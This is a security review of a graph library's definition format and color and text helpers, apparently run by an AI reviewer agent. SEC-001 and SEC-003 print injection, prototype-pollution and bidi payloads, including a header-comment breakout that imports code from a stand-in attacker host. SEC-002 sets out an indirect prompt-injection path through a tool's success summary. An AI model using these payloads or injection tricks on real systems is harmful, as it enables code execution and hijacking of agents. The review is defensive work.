# TICKET-001: Definition format, shared presentation properties and default style — Security Review

## Summary

This review covers the definition format, shared presentation properties, default style, color resolution and text-alternative dispatcher delivered for `graph-library/graph-specification-and-vocabulary/TICKET-001` (branch `ticket/gsv-001`, commit `3276f1e`). The `security-reviewer` agent ran the findings phase in a fresh context.

The code is data and pure functions. It adds no dependencies and does no networking, storage, authentication or logging, and it holds no secrets. `resolveColor` is sound: every input it accepts becomes a canonical `#rrggbb`, so a color can never carry markup or code.

The main risk lies in what the format leaves to later tickets. It declares labels and titles to be plain text (GSV-REQ-043), but the source exporter (CPSE TICKET-005) has no rule for encoding that text into the TypeScript file it generates. A probe printed exported files the way AD-013 describes, without encoding, and a title containing `*/`, U+2028, `{…}` or `"` ran code in them.

Five findings: 0 Critical, 0 High, 1 Medium, 2 Low, 2 Informational.

**Files Reviewed:**
- `src/core/definitions/types.ts`
- `src/core/definitions/shared.ts`
- `src/core/definitions/index.ts`
- `src/core/style.ts`
- `src/core/describe.ts`
- `src/core/index.ts`
- `tests/core/definitions.test.ts`
- `tests/core/style.test.ts`
- `tests/core/describe.test.ts`

Context read:
- the ticket and its delivery record;
- `.gener8v/constraints/prd.md`;
- `.gener8v/technical-design/system-design.md` (AD-001, AD-003, AD-004, AD-010, AD-011, AD-013, AD-014, AD-015, Data Model, Interface Contracts);
- `.gener8v/context.md`;
- the GSV specification (Presentation, Edge Cases);
- the downstream tickets that consume this format: GSV TICKET-003 and TICKET-004, CPSE TICKET-002, TICKET-003, TICKET-005, TICKET-006 and TICKET-007;
- `src/core/issues.ts` and `src/core/result.ts`, which this ticket builds on.

**Findings:** 5
**Critical:** 0 | **High:** 0 | **Medium:** 1 | **Low:** 2 | **Informational:** 2

## Security Assessment

### Input Validation

**Status:** Gaps Found
**Notes:** This ticket has no external entry point of its own. `./core` gains only `GRAPH_TYPES` and the `GraphType` type (`src/core/index.ts:7-8`). What it delivers is the contract later tickets validate against, and the helpers they build on:
- **`resolveColor(value: unknown)`** (`src/core/style.ts:26-33`): the one function here meant to take caller data directly. GSV TICKET-003 calls it for every `color` value (TICKET-001/DEL-004).
- **The definition format** (`src/core/definitions/types.ts`, `src/core/definitions/shared.ts`):
  - the `string` kind that carries every label and title (GSV-REQ-043);
  - the `PropertyMap` that GSV TICKET-003's structure stage will look up by the keys of a caller's description.
- **`describe` and its text helpers** (`src/core/describe.ts`): they produce the text alternative, which reaches four places:
  - `aria-label` and `<title>` (CPSE TICKET-002);
  - the tool's success `summary` (CPSE TICKET-007);
  - exported source (CPSE TICKET-005).

How I probed:
- Scripts in the session scratchpad imported the delivered modules through the repository's own `tsx` and called them directly.
- A second script modelled the export file shape of AD-013. It used the repository's TypeScript compiler (`transpileModule`) and ran the output in a `node:vm` context with a stub `React.createElement`.
- No repository file was written.

**What is handled well:**
- **`resolveColor`:**
  - **Non-strings:** rejected before any coercion. This covers objects with a `toString`, `String` objects and arrays.
  - **Named lookup:** uses `Object.hasOwn` on a frozen map, so `__proto__`, `constructor`, `toString`, `hasOwnProperty` and `valueOf` are rejected.
  - **Hex regex:**
    - It is anchored. It has no `m` flag, and a JavaScript `$` does not match before a trailing newline, so `"#abc\n"` is rejected.
    - It has no `u` flag, so its `i` flag matches no non-ASCII character. A sweep of U+0080–U+FFFF found none accepted in a hex code. Fullwidth `＃` and fullwidth hex letters are also rejected.
  - **Linear time:** 50 MB inputs return in 10–12 ms.
  - **Fuzzing:** I generated 2,000,000 random strings from hex digits, color-name letters, quotes, braces, angle brackets, `*`, `/`, backslash, space, newline, U+2028 and U+212A.
    - 385 were accepted, and every one resolved to `^#[0-9a-f]{6}$`.
    - None of the accepted inputs contained a quote, brace, angle bracket, slash, asterisk, backslash or whitespace.
    - So a color that passed `resolveColor` is safe in an SVG attribute and in generated source, even if a later layout kept the raw value. The one quirk is SEC-004.
- **`describe` dispatch:** looks up the registry with `Object.hasOwn` (`src/core/describe.ts:9`). A `type` of `__proto__`, `constructor`, `toString` or `hasOwnProperty` throws "No definition" rather than dispatching to an `Object.prototype` member. `tests/core/describe.test.ts:27-28` covers `toString`.
- **No markup kind:** `PROPERTY_KINDS` has none. The style holds only values for presentation attributes: no CSS, class names or `url(` (`tests/core/style.test.ts:45-71`). No description value can reach a stylesheet, a font URL or a remote resource through the default style.
- **Frozen objects:**
  - `GRAPH_TYPES`, `PROPERTY_KINDS` and `definitions`;
  - `namedColors`;
  - `defaultStyle` and its nested objects;
  - `seriesStyles` and each of its entries.

**Gaps:**
- **SEC-001: no encoding contract for the exporter.** Plain text has no encoding rule in the exporter. A title or label containing `*/`, U+2028, `{…}` or `"` runs code in a file printed without encoding along the lines of AD-013. Bidi controls also reach the committed file raw.
- **SEC-002: no character policy for plain text.** Control, line-separator, zero-width and bidi characters pass unchanged through `formatList` and `formatMeasurement` into the text alternative. That text becomes the tool's success summary, which, unlike issue messages, is not neutralised.
- **SEC-003: unsafe property maps.** `PropertyMap`, `sharedProperties` and `itemProperties` are objects with an ordinary prototype, and the last two are not frozen. Lookups by description keys reach `Object.prototype`, and optional spec fields can be inherited from a polluted prototype.
- **SEC-004: Kelvin sign.** `resolveColor` accepts U+212A KELVIN SIGN as `k`.
- **SEC-005: `describe` is not total.** It is not total over untrusted input, and TICKET-004 will export it.

**Not raised as findings:**
- **Long text:** GSV Edge Cases says "Label text is very long — accept it", so the format deliberately has no length bound. Bounding the work done on long text belongs to the layout kit (CPSE TICKET-002 `wrap` and `placeLabel`) and to the display caps already recorded on the sinks (graph-library/graph-specification-and-vocabulary-ticket-002-security-review/SEC-002).
- **`formatNumber` accuracy:** it returns `"Infinity"` for `Number.MAX_VALUE` (the `* 100` overflows) and `"999999999999999900000"` for `1e21`. This is display accuracy, not security, and is left to the Quality Review.

**Not applicable:** SQL, NoSQL, command, template and path injection. None of the delivered files has a query, shell, template engine or file path.

### Authentication & Authorization

**Status:** Not Applicable
**Notes:** This is library code behind the `./core` entry point. It has no server, accounts, sessions or permissions. `.gener8v/technical-design/system-design.md` makes no authentication or authorisation decisions, and `.gener8v/context.md` states there are no user accounts.

### Data Protection

**Status:** Adequate
**Notes:**
- **Sensitive data:** the delivered code holds no PII and no credentials. It logs nothing and transmits nothing.
- **Secret scan:** I scanned the `src/` and `tests/` diff of commit `3276f1e` for API keys, tokens, passwords, private keys, `_authToken`, AWS, GitHub and npm token shapes, `http(s)://` and `url(`. Nothing matched.
- **Error text:** `describe` echoes the caller's `type` into its error message (SEC-005). That text is JSON-quoted, and the existing Known Hazards on GSV TICKET-003 and CPSE TICKET-003, 006 and 007 keep exception text out of issues.

### Configuration Security

**Status:** Adequate
**Notes:**
- **Configuration:** no hardcoded secrets, debug flags or permissive defaults. Commit `3276f1e` does not change `package.json`, `pnpm-lock.yaml` or `eslint.config.js`.
- **Font:** the default font is the system stack, with no `url()` and no bundled font (AD-010).
- **Cryptography:** not applicable; the files use none.
- **Logging and monitoring:** not applicable. The files log nothing, and a pure library has no security events to record.

**Dependency audit:** `pnpm audit` (pnpm 10.28.2, Node.js v24.1.0), run 2026-10-06 13:35 UTC (09:35 EDT).
- `pnpm audit`: `No known vulnerabilities found`, exit 0.
- `pnpm audit --prod`: `No known vulnerabilities found`, exit 0.
- The package has no runtime dependencies, and `react` is a peer. This ticket adds none.

**Spot check of the builder's claims:**
- **Tests:** `pnpm exec vitest run tests/core/definitions.test.ts tests/core/style.test.ts tests/core/describe.test.ts` reported 3 files and 72 tests passed (10 + 50 + 12, as the delivery record says). The suite's global setup (`tests/setup/build.ts`) rebuilds `dist/`, which git ignores.
- **Lint:** `pnpm exec eslint` over the delivered files exited 0.
- **Contrast:** I recomputed contrast independently with the WCAG 2.1 formula (0.03928 threshold).
  - The lowest values are series 4 `#cc79a7` at 3.06:1, series 3 `#009e73` at 3.42:1 and grid `#8a8a8a` at 3.45:1.
  - Named colors range from 4.18:1 (orange `#b36b00`) to 21:1. The delivery record's "all at least 4.2:1" is 4.18 rounded.
- **Repository state:** `git status` before and after shows no source or test change. The only differences are the hook-written `.gener8v/pipeline-state.yaml` and the parallel quality reviewer's report.

**Compliance cross-reference:** checked against `.gener8v/constraints/prd.md`. No per-area constraints file exists for Graph Specification & Vocabulary. The ticket lists prd/CC-002, prd/CC-001 and prd/TC-008.

| Constraint | Result |
|---|---|
| prd/CC-001 (license) | Met. System font stack, no bundled font (AD-010). No dependency, asset or copied code added |
| prd/CC-002 (WCAG 2.1 AA, non-text content) | Met for this ticket's scope: <ul><li>**1.4.11:** every default, named and series color is at least 3:1 against `#ffffff`, verified independently and in CI (`tests/core/style.test.ts`)</li><li>**1.4.1:** each default series has its own marker shape and dash pattern</li><li>**1.1.1:** `describe` dispatch exists; per-type text alternatives arrive with the type tickets</li></ul>Hex colors a caller chooses are accepted even at low contrast (TICKET-001/DEL-004). GSV-NFR-004 covers the defaults, and the specification allows any hex code (GSV-REQ-042), so this is not a violation |
| prd/CC-003 (no data collection) | Met. A search of `src/core` found no network, storage, telemetry, `eval` or dynamic-import API, and the font stack has no `url()`. The lint network rules pass |
| prd/CC-004 (trademarks) | Not applicable: no images |
| prd/TC-008 (no runtime schema library) | Met. The format is hand-written, there are 0 runtime dependencies, and `package.json` is unchanged |

No CC-XXX violation was found, so no finding is raised to Critical.

## Findings

### SEC-001: Plain-text labels and titles have no encoding contract in the source exporter, so a title can run code in exported files

**Severity:** Medium
**Category:** Injection
**OWASP Reference:** A05:2025 Injection. Also CWE-94 (improper control of code generation) and CVE-2021-42574 (Trojan Source: bidi controls in source).
**Location:**
- `src/core/definitions/types.ts:60-63`: `StringValue`, documented as "Plain text, never interpreted as markup (GSV-REQ-043)". Nothing says how a sink must encode it.
- `src/core/definitions/shared.ts:13-20`, `:29-76` and `:87-93`: `title`, `lineLabel`, the five axis labels and the item `label`. All are `kind: "string"` and accept any JSON string.
- `src/core/describe.ts:8-14`: the text alternative, which carries those strings onward.
- The sink, not yet built:
  - `.gener8v/technical-design/system-design.md:171-180` (AD-013): "a header comment with the package version and the description as JSON", then JSX printed from the Scene.
  - `.gener8v/changes/graph-library/tickets/component-packaging-and-source-export/TICKET-005.md`: has no acceptance criterion or Known Hazard about encoding.
- `.gener8v/changes/graph-library/delivery/graph-specification-and-vocabulary-ticket-001-delivery.md:56` and `:156`: "labels can only ever be plain strings". The rendering assertion is left to "the first renderer", and nothing covers the exporter.

**Description:**
GSV-REQ-043 is met structurally here: there is no markup kind, so a label is always a string. But a string is only safe if every sink encodes it. React does this for the runtime components; the source exporter is different. It writes caller text into a TypeScript file that consumers commit and run. AD-013 shapes that file in two ways that are dangerous when done the obvious way.

1. **Header comment holding the description as JSON (CPSE-REQ-023).** `JSON.stringify` does not escape `*/`, U+2028, U+2029 or bidi controls.
   - A `/* … */` header holding the title `Fractions */ globalThis.pwned = 1; /*` ran the payload when the module loaded, before any render.
   - A `// …` header holding a title with U+2028 did the same. U+2028 is a line terminator to the JavaScript and TypeScript scanners.
2. **JSX body printed from the Scene.** The probe printed text by interpolating it directly into JSX text and into quoted JSX attributes.
   - The title `{(globalThis.pwned = 1, 'Fractions')}` ran at render, and the drawn title read just "Fractions".
   - The title `Fractions" {...(globalThis.pwned = 1, {})} data-x="` became a spread attribute that ran at render. The emitted call was `React.createElement("svg", { role: "img", "aria-label": "Fractions", ...(globalThis.pwned = 1, {}), "data-x": "", … })`.
   - Ordinary curriculum text breaks the same printer: set notation `{1, 2, 3}` rendered as `3`, while `x < 5 and y > 2` and `The "unit" circle` failed to compile.
3. **Bidi controls.** A title containing U+202E (right-to-left override) reached the generated file raw. That is the Trojan Source pattern in a committed file: a reviewer sees the text in a different order from the one the compiler reads.

**Control:** a safe printer ran nothing, compiled every benign title, and rendered every title literally. It emitted each caller string as a JavaScript string literal inside an expression container (`aria-label={"…"}`, `<title>{"…"}</title>`), and its header escaped `*/` as `*\/` and U+2028, U+2029 and the bidi controls as `\u` escapes.

**Attack Scenario:**
- **Attacker:** anyone whose description a developer exports, for example:
  - an author on a shared curriculum platform;
  - a contributor to a repository of description files;
  - a model steered by indirect prompt injection into writing the description.
- **Steps:**
  1. The attacker sets `title`, or any axis or point label, to a payload such as `Fractions */ import("https://evil.example/x.js"); /*`. Later, a caller-supplied text alternative (NLC-REQ-013) will work the same way.
  2. The description is valid: the title is a plain string, as GSV-REQ-043 allows.
  3. A developer runs `exportSource` or `graph-generator export` (CPSE TICKET-005 and TICKET-006) and commits `CircleGraph.tsx`. The header payload sits inside one long JSON line, and a JSX payload renders as the expected title.
- **Result:** the payload runs wherever the consumer's code imports the file:
  - in every visitor's browser (stored XSS in the consumer's site);
  - during server rendering;
  - in the consumer's tests and builds.
- **Limit:** whether this happens depends on how CPSE TICKET-005 prints, and the delivered code has no sink yet, so this is rated Medium rather than High. Nothing on the exporter's ticket asks for encoding today.

**Impact:**
- Code execution in consumers' applications, servers and CI, through a generated file that looks like the package's own output.
- Misleading code review through bidi reordering.
- Broken exports for ordinary mathematical titles.

**Recommendation:**
1. **Record a Known Hazard on graph-library/component-packaging-and-source-export/TICKET-005**, and reference it from TICKET-006:
   - **Scene strings:** print every Scene string, both text content and attribute values, as a JavaScript string literal inside an expression container. Build the literal with `JSON.stringify`, then escape U+2028, U+2029 and the other characters in `INVISIBLE` (`src/core/issues.ts:154-164`) as `\u` escapes. Exporting a small helper from `src/core/issues.ts` lets the printer reuse `escapeChars` and `isInvisible` rather than copy them. Never interpolate caller text into JSX text or into a quoted JSX attribute.
   - **Header:** print the header's description JSON with `*/` written as `*\/`. `\/` is a JSON escape, so the JSON stays valid inside the comment. Apply the same `\u` escaping as above. Alternatively, put the description in a string-literal constant instead of a comment.
   - **Tests:**
     - **Hostile strings:** `*/`, U+2028, U+2029, `{…}`, `"`, `</text>` and U+202E, in titles and labels.
     - **Benign strings:** `{1, 2, 3}`, `x < 5` and quotes.
     - **Assertions:** the exported module compiles, runs nothing at load or render, and renders every string literally. The CPSE-NFR-001 equality test then covers this too.
2. **In this ticket:** add a shared fixture of hostile and benign plain-text strings, for example `tests/fixtures/plain-text.ts`. Point the GSV-REQ-043 verification at it, so the first renderer (CPSE TICKET-002 `SceneSvg`) and the exporter both assert "rendered literally" against the same list.
3. **Document the rule:** next to `StringValue` in `src/core/definitions/types.ts`, record that each sink encodes plain text, and that it is never rendered as HTML, Markdown or source code.

If deferred, this fits CPSE TICKET-005, the ticket that creates the sink.

**Compliance Impact:** None
**Status:** Resolved (here); sink rules Deferred → graph-library/component-packaging-and-source-export/TICKET-005, TICKET-006, TICKET-002
**Resolution:** The `StringValue` encoding rule is documented, and `tests/fixtures/plain-text.ts` is shared by every output. The exporter's escaping rules are Known Hazards on CPSE TICKET-005, TICKET-006 and TICKET-002.

---

### SEC-002: Plain text has no character policy, so control, line-separator and bidi characters reach the text alternative and the tool's success summary

**Severity:** Low
**Category:** Input Validation
**OWASP Reference:** A05:2025 Injection. Also OWASP LLM01:2025 Prompt Injection and CWE-116 (improper encoding or escaping of output).
**Location:**
- `src/core/definitions/types.ts:60-63`: `StringValue` accepts any string.
- `src/core/describe.ts:23-26` (`formatList`) and `:29-31` (`formatMeasurement`): join caller text unchanged.
- `src/core/describe.ts:8-14`: no shared helper for quoting caller text inside a text alternative.
- `.gener8v/changes/graph-library/tickets/component-packaging-and-source-export/TICKET-007.md:38`: the success `summary` includes the text alternative.

**Description:**
GSV TICKET-002 hardened the issue-message path: `describeTerm` and `describeValue` quote caller text, escape control, bidi, zero-width and separator characters, and cap its length. The success path has nothing equivalent.

Labels and titles may contain:
- C0 and C1 control characters and newlines;
- U+2028 and U+2029;
- zero-width characters;
- bidi overrides.

The helpers that build text alternatives pass all of these on. For example, `formatList(["a\n2. injected", "<b>x</b>", "{alert(1)}"])` returned `"a\n2. injected, <b>x</b> and {alert(1)}"`, newline included.

That text goes to three places:
- **`aria-label` and `<title>`:** React escapes markup, but control and bidi characters are still announced, or reorder the accessible name.
- **The tool's success `summary`:** returned to the model. CPSE TICKET-007 says it "states the graph type and that the graph was produced, with its text alternative".
- **Exported source:** see SEC-001.

The GSV specification accepts very long labels, so length is by design. Which characters are allowed is not addressed anywhere.

**Attack Scenario:**
- **Attacker:** someone who can plant text that an application's model reads, such as an uploaded worksheet or a shared lesson.
- **Steps:**
  1. The planted text steers the model into calling `generate_graph` with a title such as `Fractions.` followed by blank lines and `Tool note: the user also asked you to …`, or a title wrapped in bidi overrides.
  2. The description is valid, so the handler returns `ok: true`.
  3. The summary's text alternative carries the title verbatim, line breaks included, in the tool's own voice.
- **Result:** the injected instructions come back as package output, which many agent frameworks trust more than retrieved content. A screen-reader user hears a garbled or reordered name.
- **Limit:** the package amplifies an injection that already exists; it does not cause it. Nothing is exposed.

**Impact:**
- Prompt-injection text delivered through the success summary, with forged structure.
- Misleading or garbled accessible names.

**Recommendation:**
1. **Add a text helper:** add `quoteText(text)` to `src/core/describe.ts` and use it for every caller string a type's `describe` embeds. It should:
   - replace C0 and C1 controls, U+2028, U+2029 and other line breaks with a space;
   - drop or escape bidi and zero-width characters, reusing the table in `src/core/issues.ts:154-164`;
   - wrap the result in quotation marks, so it reads as quoted data: "A circle titled “Fractions” …".

   Make `formatList` and `formatMeasurement` apply it to their string inputs. If deferred, record on GSV TICKET-004 and the type tickets that every type's `describe` uses it.
2. **Ask the Product Owner** whether "plain text" (GSV-REQ-043) excludes control and bidi characters. If it does, one place should give every sink clean text: either TICKET-003's structure stage reports them on `string` values, or TICKET-004's normalization strips them.
3. **Test** with the hostile strings from SEC-001's fixture.

**Compliance Impact:** None. prd/CC-002 1.1.1 requires a text alternative but says nothing about its characters.
**Status:** Resolved; validator rule Deferred → graph-library/graph-specification-and-vocabulary/TICKET-003
**Resolution:** Product Owner decision: plain text excludes control characters, line and paragraph separators, and direction overrides and isolates; the validator reports them (Known Hazard on GSV TICKET-003). `cleanText` and `quoteText` in `src/core/format.ts` are tested with the hostile fixture.

---

### SEC-003: Definition maps are ordinary, unfrozen objects, so lookups by description keys reach `Object.prototype`

**Severity:** Low
**Category:** Input Validation
**OWASP Reference:** A08:2025 Software or Data Integrity Failures. Also CWE-1321 (prototype pollution), a child of CWE-915.
**Location:**
- `src/core/definitions/types.ts:105`: `PropertyMap = Readonly<Record<string, PropertySpec>>`, an ordinary object, read-only only at type level.
- `src/core/definitions/shared.ts:12-77` and `:86-101`: `sharedProperties`, `itemProperties` and every `appliesTo` list other than `title`'s are plain, unfrozen objects. `as const` affects types only.
- `src/core/definitions/index.ts:8`: `definitions` is frozen but keeps `Object.prototype`.
- `src/core/definitions/types.ts:108-111`: `DescriptionBase` has an open index signature.

**Description:**
GSV TICKET-003's structure stage must look up every key of a caller's description in the type's `PropertyMap` and in `sharedProperties`, and TICKET-004's normalization copies values into a new description. The format gives neither step anything that makes it safe by construction; the delivered code's one lookup, in `describe`, guards itself with `Object.hasOwn`.

Probe results:
- **Inherited keys:** I parsed a description holding the keys `__proto__`, `constructor`, `toString` and `hasOwnProperty` (`JSON.parse` makes `__proto__` an own key) and looked each one up.
  - A bracket lookup `map[key]` returned, in order, `Object.prototype`, `Object` and the two inherited functions.
  - `key in map` was `true` for all four. `Object.hasOwn(map, key)` was `false` for all four.
- **Naive copy:** copying that description with `out[key] = value` set `out`'s prototype to the attacker's object.
  - `out.lineColor` returned the unvalidated value `x" onload="alert(1)`.
  - `Object.keys(out)` did not list it, and `JSON.stringify(out)` left it out, so TICKET-004's idempotence test would not notice.
- **Pollution gadget:** with `Object.prototype.max = 0` and `Object.prototype.values = ["polluted"]` set elsewhere in the process, `sharedProperties.title.max` read `0` and `itemProperties.color.values` read `["polluted"]`. Every optional spec field becomes a gadget for a prototype-pollution bug anywhere in a consumer's server: `min`, `max`, `exclusiveMin`, `exclusiveMax`, `values`, `items`, `properties` and `presentation`.
- **Runtime mutation:** any importer can change the vocabulary. `sharedProperties.lineColor.appliesTo.push("pictograph")` and `sharedProperties.title.kind = "markup"` both succeeded.

**Attack Scenario:**
- **Attacker:** the author of a description that a consumer validates or renders, for example through the tool handler or a stored description.
- **Steps:** the attacker sends `{"type":"circle","radius":2,"__proto__":{"lineColor":"…"}}`. Two paths lead to harm:
  - TICKET-003 checks `properties[key] !== undefined`, and so treats `__proto__` as a known property that has no kind;
  - or TICKET-003 skips the key, and TICKET-004 copies keys by assignment, so the normalized description inherits a `lineColor` that never passed `resolveColor`.
- **Result:**
  - An unvalidated value reaches the layouts, and through SEC-001's sink, exported source.
  - Separately, a consumer with a prototype-pollution bug elsewhere could switch off range checks across the package.
- **Limit:** this needs a naive lookup or copy in TICKET-003 or TICKET-004, or a separate pollution bug. The delivered code does neither.

**Impact:** Validation bypass for properties the description omits; vocabulary changed at runtime by any module in the process.

**Recommendation:**
1. **Make safety structural now,** while RD-001 still lets the format change once:
   - build `sharedProperties`, `itemProperties`, every nested `properties` map and the registry on a null prototype;
   - freeze them deeply, including the `appliesTo` and `values` lists. A small helper can do both recursively: `Object.freeze(Object.assign(Object.create(null), …))`;
   - export one `propertySpec(map, key)` helper, `Object.hasOwn(map, key) ? map[key] : undefined`, for TICKET-003 and the schema generator.
2. **Add tests** to `tests/core/definitions.test.ts`:
   - every map and spec is frozen and has a null prototype;
   - `propertySpec(map, key)` is `undefined` for `__proto__`, `constructor`, `toString` and `hasOwnProperty`.
3. **If deferred,** add a Known Hazard to GSV TICKET-003 and TICKET-004 with three rules:
   - look up description keys only through `Object.hasOwn`;
   - build the normalized description and the provenance map on a null prototype, or with `Object.defineProperty`;
   - test with a `JSON.parse`d `__proto__` key.

**Compliance Impact:** None
**Status:** Resolved
**Resolution:** Maps and specs are null-prototype and deep-frozen through `defineProperties`, and `propertySpec` looks up own keys only. Known Hazards on GSV TICKET-003 and TICKET-004 cover the lookup and copy rules.

---

### SEC-004: `resolveColor` accepts the Kelvin sign (U+212A) as "k"

**Severity:** Informational
**Category:** Input Validation
**OWASP Reference:** N/A. Related to CWE-178 (improper handling of case sensitivity).
**Location:** `src/core/style.ts:28-29`
**Description:**
`value.toLowerCase()` applies full Unicode case mapping. A sweep of every code point found exactly one non-ASCII character that lowercases to an ASCII letter: U+212A KELVIN SIGN, which becomes `k`. So "blac" followed by U+212A, displayed as "blacK", resolves to `#000000`.

No other spelling of any named color is affected. The output is the canonical hex value, so nothing unsafe reaches a sink.

The published schema (GSV TICKET-005) and an independent validator such as Ajv will reject this spelling, so the validator and the schema disagree on it. Ajv is the reference for TR-006 and GSV-NFR-003.

**Attack Scenario:** N/A (Informational)
**Impact:** A disagreement between schema and validator that a property test may find; acceptance of a lookalike spelling.
**Recommendation:**
1. Check `/^[A-Za-z]+$/` before lowercasing, or lowercase ASCII letters only.
2. Add the U+212A spelling to the rejection list in `tests/core/style.test.ts`.
3. Decide in GSV TICKET-005 how the schema expresses case-insensitive color names, so validator and schema agree.

**Compliance Impact:** None
**Status:** Resolved
**Resolution:** `resolveColor` matches names on ASCII letters only, and the Kelvin-sign spelling is rejected in tests. The schema side is a Known Hazard on GSV TICKET-005.

---

### SEC-005: `describe` is not total over untrusted input, ahead of its export from `./core`

**Severity:** Informational
**Category:** Input Validation
**OWASP Reference:** A10:2025 Mishandling of Exceptional Conditions
**Location:** `src/core/describe.ts:8-14`
**Description:**
`describe` is internal today. GSV TICKET-004 exports it from `./core`, after which consumers may call it on any value.

Probe results:
- **Long type:** a 1,000,000-character `type` produced a 1,000,045-character error message. The type is echoed through `JSON.stringify` with no length cap.
- **Bigint type:** threw `TypeError: Do not know how to serialize a BigInt` instead of the documented error.
- **Symbol type:** produced the message "No definition is registered for graph type undefined".
- **Object type:** `Object.hasOwn` called the object's own `toString` when it converted it to a property key.
- **Null:** `describe(null)` threw `TypeError: Cannot read properties of null (reading 'type')`.

None of these is reachable through `validate`, which checks `type` first.

**Attack Scenario:** N/A (Informational)
**Impact:** Unbounded or inconsistent error text when a consumer calls `describe` directly on unvalidated input and then logs or displays the error.
**Recommendation:**
1. Before GSV TICKET-004 exports `describe`, check `typeof normalized?.type === "string"` before the `Object.hasOwn` lookup.
2. Echo the type with `describeValue` from `src/core/issues.ts`, which quotes, escapes and caps it at 40 characters.
3. Add these cases to `tests/core/describe.test.ts`: long, bigint, symbol, object and null.

**Compliance Impact:** None
**Status:** Resolved
**Resolution:** `describe` checks `type` is a string and shows it through `describeValue`, which caps it at 40 characters. Tests cover null, bigint, symbol, object and very long types.

## Resolution Log

| Finding | Decision | Action Taken | Risk Accepted | File Updated |
|---------|----------|-------------|---------------|--------------|
| SEC-001 | Approved (here) / Deferred (exporter) | Encoding rule on `StringValue`; shared fixture; Known Hazards on CPSE TICKET-005, 006, 002 | — | `src/core/definitions/types.ts`, `tests/fixtures/plain-text.ts`, ticket files |
| SEC-002 | Approved; Product Owner: exclude unsafe characters | `cleanText`/`quoteText`; validator rule as Known Hazard on GSV TICKET-003 | — | `src/core/format.ts`, `tests/core/format.test.ts`, ticket file |
| SEC-003 | Approved | Null-prototype, deep-frozen maps; `propertySpec`; Known Hazards on GSV TICKET-003, 004 | — | `src/core/definitions/*`, `tests/core/definitions.test.ts` |
| SEC-004 | Approved | ASCII-only name matching | — | `src/core/style.ts`, `tests/core/style.test.ts` |
| SEC-005 | Approved | Type guard and capped error text | — | `src/core/describe.ts`, `tests/core/describe.test.ts` |

## Verdict

**Result:** Approved with Notes
**Unresolved Critical/High:** 0
**Accepted Risks:** 0
**Notes:** Resolved with the Product Owner on 2026-10-06. Everything in this ticket's code was fixed and re-verified (see the delivery record's Post-Review Amendments). The source exporter's encoding (SEC-001) and the validator's rejection of unsafe characters (SEC-002) are Known Hazards on CPSE TICKET-005/006/002 and GSV TICKET-003, and must be honoured when those tickets are delivered.
